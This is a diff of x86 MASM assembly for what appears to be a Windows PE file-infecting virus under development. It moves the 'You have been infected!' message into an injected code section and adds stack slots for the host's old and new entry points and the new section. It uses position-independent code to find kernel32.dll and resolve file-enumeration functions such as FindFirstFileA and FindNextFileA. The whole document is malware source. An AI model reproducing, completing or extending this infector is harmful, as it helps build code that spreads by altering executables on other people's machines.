@@ -1,8 +1,10 @@
 include misc.inc
 
 .code
-	strCaption db 'Notice', 0
-    strContent db 'You have been infected!', 0
+old_entry:
+    invoke ExitProcess, 0
+
+.code inject
     strCFA db 'CreateFileA', 0
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
@@ -11,21 +13,28 @@ include misc.inc
     strGPA db 'GetProcAddress', 0
     stru32dll db 'user32.dll', 0
     strMBA db 'MessageBoxA', 0
-    
+	strCaption db 'Notice', 0
+    strContent db 'You have been infected!', 0
+        
 	; Order of each variable IN THE STACK
 	; Position relative to r|ebp calculated by -(Order * regSz)
-    kernel32dll dd 1
-    OrdinalTbl dd 2
-    NamePtrTbl dd 3
-    AddrTbl dd 4
-    k32NumFunc dd 5
-    ;    ImageBaseAddress dd ?
-;    OldEntryPoint dd ?
-;    Inject dd ?
-;    user32dll dd ?
+	
+	ImageBaseAddress EQU 1
+    OldEntry EQU 2
+    NewSection EQU 3
+	NewEntry EQU 4
+	
+    kernel32dll EQU 5
+    OrdinalTbl EQU 6
+    NamePtrTbl EQU 7
+    AddrTbl EQU 8
+    k32NumFunc EQU 9
+    user32dll EQU 10
     
-    stack_reserved db 8 ; Number of values to be stored in the stack
-    regSz db 4 ; 8 for 64-bit
+    stack_reserved EQU 10 ; Number of values to be stored in the stack
+    regSz EQU 4 ; 8 for 64-bit
+    
+    entrySectionOffset EQU $ - offset strCFA
     
 start:
     call here
@@ -37,10 +46,12 @@ start:
     imul eax, regSz
     sub esp, eax
     
-    mov eax, [ebp] ; NewEntry + 1 + 4
-    sub eax, 5 ; eax = NewEntry
+    mov edx, [ebp] ; NewEntry + 1 + 4
+    sub edx, 5 ; eax = NewEntry
+    toStack(NewEntry, edx)
     
-    
+    sub edx, entrySectionOffset
+    toStack(NewSection, edx)
     
     ; Find kernel32.dll
     ASSUME FS:NOTHING
@@ -72,6 +83,5 @@ start:
     toStack(k32NumFunc, edx)
     
     
-    invoke ExitProcess, 0
 
 end start
